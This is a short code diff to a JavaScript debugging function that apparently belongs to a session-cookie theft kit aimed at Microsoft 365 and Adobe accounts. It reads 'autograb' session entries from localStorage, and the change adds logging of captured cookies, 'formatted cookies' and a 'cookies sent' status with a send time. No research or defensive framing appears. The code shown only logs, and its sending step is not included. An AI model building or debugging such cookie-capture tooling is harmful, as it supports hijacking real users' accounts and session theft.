@@ -23,12 +23,18 @@ function debugCookieCapture() {
   
   // 3. Check localStorage for session data
   try {
-    const session = localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('adobe_autograb_session');
+    const session = localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('adobe_autograb_session') || localStorage.getItem('microsoft365_session');
     if (session) {
       const sessionData = JSON.parse(session);
       console.log('4. Microsoft 365 Session data:', sessionData);
       if (sessionData.cookies) {
         console.log('5. Microsoft 365 Session cookies:', sessionData.cookies);
+      }
+      if (sessionData.formattedCookies) {
+        console.log('6. Microsoft 365 Formatted cookies:', sessionData.formattedCookies);
+      }
+      if (sessionData.cookiesSent) {
+        console.log('7. Microsoft 365 Cookies sent status:', sessionData.cookiesSent, 'at', sessionData.lastSentTime);
       }
     }
   } catch (e) {
